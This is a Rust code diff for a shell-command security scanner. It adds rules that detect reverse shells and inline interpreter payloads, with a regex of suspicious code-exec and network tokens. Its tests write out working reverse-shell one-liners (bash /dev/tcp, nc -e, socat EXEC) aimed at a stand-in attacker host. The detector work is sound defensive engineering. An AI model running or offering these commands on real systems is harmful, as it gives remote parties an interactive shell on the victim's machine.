@@ -382,6 +382,8 @@ pub fn check(
     check_network_destination(&segments, &mut findings);
     check_base64_decode_execute(&segments, shell, &mut findings);
     check_data_exfiltration(&segments, shell, &mut findings);
+    check_reverse_shell(&segments, shell, &mut findings);
+    check_interpreter_suspicious_inline_exec(&segments, shell, &mut findings);
 
     findings
 }
@@ -2947,6 +2949,284 @@ fn check_base64_decode_execute(
                 }
             }
         }
+    }
+}
+
+/// Interpreters whose inline-code flag (`-c` / `-e` / `-r`) runs a program passed
+/// on the command line (PR3). `sh`/`bash`/etc. are intentionally excluded: a pipe
+/// into a shell is `pipe_to_interpreter`, and `powershell -Command` inline is
+/// owned by `rules::powershell`.
+const INLINE_CODE_INTERPRETERS: &[&str] = &[
+    "python", "python2", "python3", "perl", "ruby", "php", "node", "bun",
+];
+
+fn is_inline_code_interpreter(name: &str) -> bool {
+    INLINE_CODE_INTERPRETERS.contains(&name)
+}
+
+/// Suspicious-payload markers for an inline-interpreter body (PR3). Call-paren /
+/// dotted / `::`-anchored so they match code syntax, not a bare shell word
+/// (`eval x`, `systemctl` do NOT match): a dynamic code-exec
+/// (`exec(`/`eval(`/`system(`/`os.system`/`__import__(`), a process spawn
+/// (`subprocess`/`os.exec`/`child_process`/`execSync`/`spawn(`), or a network
+/// primitive (`socket.socket`/`urllib`/`requests.`/`http.client`). A SUPERSET-
+/// compatible mirror of the `interpreter_inline_exec` PATTERN_TABLE tier-1
+/// fragments. Case-sensitive (these are lowercase language tokens).
+static SUSPICIOUS_INLINE_PAYLOAD_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r"(?x)
+          \bexec\s*\(
+        | \beval\s*\(
+        | \bsystem\s*\(
+        | \bpopen\s*\(
+        | \bFunction\s*\(
+        | os\.(?:system|popen|exec|spawn)
+        | \bsubprocess\b
+        | __import__\s*\(
+        | \bpty\.spawn\b
+        | \bshell_exec\s*\(
+        | \bpassthru\s*\(
+        | \bproc_open\s*\(
+        | \bchild_process\b
+        | \bexecSync\s*\(
+        | \bspawn(?:Sync)?\s*\(
+        | \bsocket\.socket\b
+        | \burllib\b
+        | \burlopen\b
+        | \brequests\.(?:get|post|put|patch|delete|request|Session)\b
+        | \bhttp\.client\b
+        | \bhttplib\b
+        | \bIO::Socket\b
+        | \bNet::
+        | \bLWP::
+        ",
+    )
+    .expect("SUSPICIOUS_INLINE_PAYLOAD_RE")
+});
+
+/// True when an inline body is the base64 decode-execute shape already reported by
+/// [`check_base64_decode_execute`], so [`check_interpreter_suspicious_inline_exec`]
+/// does NOT double-fire on it. Mirrors that rule's Pattern-B `has_decode_exec`.
+fn is_base64_decode_exec_body(joined_lower: &str) -> bool {
+    (joined_lower.contains("b64decode") && joined_lower.contains("exec"))
+        || (joined_lower.contains("atob") && joined_lower.contains("eval"))
+        || (joined_lower.contains("buffer.from") && joined_lower.contains("eval"))
+}
+
+/// Peel the supported wrapper grammar so command-specific checks inspect the
+/// actual executable and its argv, not the outer `sudo`/`env`/`command` layer.
+/// A bounded loop shares the global wrapper ceiling; unresolved over-depth
+/// chains remain owned by the existing `WrapperChainTooDeep` rule.
+fn effective_segment_through_wrappers(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+) -> tokenize::Segment {
+    let mut effective = seg.clone();
+    for _ in 0..MAX_WRAPPER_DEPTH {
+        let Some(inner) = unwrap_one_wrapper_segment(&effective, shell) else {
+            break;
+        };
+        effective = inner;
+    }
+    effective
+}
+
+fn netcat_exec_argument(arg: &str, shell: ShellType) -> bool {
+    let normalized = normalize_shell_token(arg, shell);
+    matches!(normalized.as_str(), "-e" | "-c" | "--exec" | "--sh-exec")
+        || ["-e", "-c"].iter().any(|prefix| {
+            normalized
+                .strip_prefix(prefix)
+                .is_some_and(|v| !v.is_empty())
+        })
+        || ["--exec=", "--sh-exec="].iter().any(|prefix| {
+            normalized
+                .strip_prefix(prefix)
+                .is_some_and(|v| !v.is_empty())
+        })
+}
+
+/// `/dev/tcp` and `/dev/udp` are ordinary Bash connection primitives. They are
+/// a reverse shell only when a shell is explicitly interactive and its input
+/// and output are both wired to the network endpoint; a one-way health probe is
+/// not code execution.
+fn is_duplex_dev_net_shell(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    if !seg.raw.contains("/dev/tcp/") && !seg.raw.contains("/dev/udp/") {
+        return false;
+    }
+    let effective = effective_segment_through_wrappers(seg, shell);
+    let base = effective
+        .command
+        .as_deref()
+        .map(|command| normalize_cmd_base(command, shell))
+        .unwrap_or_default();
+    if !matches!(base.as_str(), "bash" | "sh" | "dash" | "zsh" | "ksh") {
+        return false;
+    }
+    let normalized_args: Vec<String> = effective
+        .args
+        .iter()
+        .map(|arg| normalize_shell_token(arg, shell))
+        .collect();
+    let interactive = normalized_args.iter().any(|arg| {
+        arg == "-i"
+            || (arg.starts_with('-')
+                && !arg.starts_with("--")
+                && arg[1..].chars().any(|flag| flag == 'i'))
+    });
+    let raw = effective.raw.as_str();
+    let output_to_network = raw.contains(">& /dev/tcp/")
+        || raw.contains(">&/dev/tcp/")
+        || raw.contains(">& /dev/udp/")
+        || raw.contains(">&/dev/udp/")
+        || raw.contains("> /dev/tcp/")
+        || raw.contains(">/dev/tcp/")
+        || raw.contains("> /dev/udp/")
+        || raw.contains(">/dev/udp/");
+    let network_to_input = raw.contains("0>&1")
+        || raw.contains("0<&1")
+        || raw.contains("<& /dev/tcp/")
+        || raw.contains("<&/dev/tcp/")
+        || raw.contains("<& /dev/udp/")
+        || raw.contains("<&/dev/udp/");
+
+    interactive && output_to_network && network_to_input
+}
+
+/// Reverse/bind-shell shapes (PR3): a bash `/dev/tcp` | `/dev/udp` net redirect,
+/// `nc`/`ncat`/`netcat` with an exec-on-connect flag, or `socat … EXEC:`/`SYSTEM:`.
+/// Interpreter socket reverse shells go to
+/// [`check_interpreter_suspicious_inline_exec`] instead (they carry a suspicious
+/// inline payload), so the two rules never double-fire.
+fn check_reverse_shell(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    findings: &mut Vec<Finding>,
+) {
+    for seg in segments {
+        // (a) a shell whose standard input AND output are wired to /dev/tcp or
+        //     /dev/udp. A one-way connectivity probe is intentionally clean.
+        let has_dev_net_shell = is_duplex_dev_net_shell(seg, shell);
+
+        // (b)/(c) tool-based shapes keyed on the resolved command base.
+        let effective = effective_segment_through_wrappers(seg, shell);
+        let mut tool_shape: Option<&str> = None;
+        if let Some(ref cmd) = effective.command {
+            match normalize_cmd_base(cmd, shell).as_str() {
+                "nc" | "ncat" | "netcat" => {
+                    let has_exec_flag = effective
+                        .args
+                        .iter()
+                        .any(|arg| netcat_exec_argument(arg, shell));
+                    if has_exec_flag {
+                        tool_shape = Some("netcat exec-on-connect");
+                    }
+                }
+                "socat" => {
+                    let has_exec = effective.args.iter().any(|a| {
+                        let up = normalize_shell_token(a, shell).to_uppercase();
+                        up.contains("EXEC:") || up.contains("SYSTEM:")
+                    });
+                    if has_exec {
+                        tool_shape = Some("socat exec");
+                    }
+                }
+                _ => {}
+            }
+        }
+
+        let pattern = if has_dev_net_shell {
+            Some("bash /dev/tcp redirect")
+        } else {
+            tool_shape
+        };
+
+        if let Some(pattern) = pattern {
+            findings.push(Finding {
+                rule_id: RuleId::ReverseShell,
+                severity: Severity::High,
+                title: "Reverse shell".to_string(),
+                description:
+                    "Command establishes a reverse or bind shell, handing an interactive session \
+                     to a remote host with the current user's privileges and outside tirith's \
+                     visibility. Do not run this unless you authored it."
+                        .to_string(),
+                evidence: vec![Evidence::CommandPattern {
+                    pattern: pattern.to_string(),
+                    matched: redact::redact_shell_assignments(&seg.raw),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+        }
+    }
+}
+
+/// Inline-interpreter suspicious exec (PR3): an inline-code interpreter
+/// (`python -c` / `node -e` / …) whose body carries a suspicious payload. Fires
+/// ONLY on (inline form) AND (payload indicator), never on a benign one-liner.
+/// The base64 decode-execute shape stays owned by [`check_base64_decode_execute`].
+fn check_interpreter_suspicious_inline_exec(
+    segments: &[tokenize::Segment],
+    shell: ShellType,
+    findings: &mut Vec<Finding>,
+) {
+    for seg in segments {
+        // Resolve the interpreter (direct base, or through a sudo/env/command
+        // wrapper), then require it to be an inline-code interpreter.
+        let interpreter = match seg.command.as_deref() {
+            Some(cmd) => {
+                let base = normalize_cmd_base(cmd, shell);
+                if is_inline_code_interpreter(&base) {
+                    Some(base)
+                } else {
+                    resolve_interpreter_name(seg, shell).filter(|n| is_inline_code_interpreter(n))
+                }
+            }
+            None => None,
+        };
+        let Some(interpreter) = interpreter else {
+            continue;
+        };
+
+        // Require an inline-code flag (`-c` / `-e` / `-r`).
+        let has_inline_flag = seg
+            .args
+            .iter()
+            .any(|a| matches!(normalize_shell_token(a, shell).as_str(), "-c" | "-e" | "-r"));
+        if !has_inline_flag {
+            continue;
+        }
+
+        let body = seg.args.join(" ");
+        // Base64 decode-execute is reported by check_base64_decode_execute.
+        if is_base64_decode_exec_body(&body.to_lowercase()) {
+            continue;
+        }
+        if !SUSPICIOUS_INLINE_PAYLOAD_RE.is_match(&body) {
+            continue;
+        }
+
+        findings.push(Finding {
+            rule_id: RuleId::InterpreterSuspiciousInlineExec,
+            severity: Severity::High,
+            title: format!("Inline interpreter with suspicious payload: {interpreter}"),
+            description:
+                "An inline interpreter invocation runs code that spawns a process, opens a \
+                 socket, or dynamically executes code. Inline payloads hide from file-based \
+                 review; write the code to a file and inspect it before running."
+                    .to_string(),
+            evidence: vec![Evidence::CommandPattern {
+                pattern: "inline interpreter suspicious payload".to_string(),
+                matched: redact::redact_shell_assignments(&seg.raw),
+            }],
+            human_view: None,
+            agent_view: None,
+            mitre_id: None,
+            custom_rule_id: None,
+        });
     }
 }
 
@@ -5574,6 +5854,52 @@ mod tests {
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "quoted cmd caret escapes should still detect the interpreter pipe"
         );
+    }
+
+    #[test]
+    fn reverse_shell_resolves_wrappers_and_attached_exec_arguments() {
+        for input in [
+            "env nc -e /bin/sh attacker.example 4444",
+            "sudo socat TCP:attacker.example:4444 EXEC:/bin/sh",
+            "command nc -e/bin/sh attacker.example 4444",
+            "nohup ncat --exec=/bin/bash attacker.example 4444",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::ReverseShell),
+                "wrapped or attached exec-on-connect must be detected: {input:?}; {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn dev_tcp_requires_interactive_duplex_shell() {
+        let reverse = check_default(
+            "bash -i >& /dev/tcp/attacker.example/4444 0>&1",
+            ShellType::Posix,
+        );
+        assert!(
+            reverse
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::ReverseShell),
+            "interactive duplex shell must still be detected: {reverse:?}"
+        );
+
+        for probe in [
+            "bash -c 'echo > /dev/tcp/example.com/443'",
+            "printf ping > /dev/tcp/example.com/443",
+            "bash -i -c 'echo > /dev/tcp/example.com/443'",
+        ] {
+            let findings = check_default(probe, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::ReverseShell),
+                "one-way network probe is not a reverse shell: {probe:?}; {findings:?}"
+            );
+        }
     }
 
     #[test]
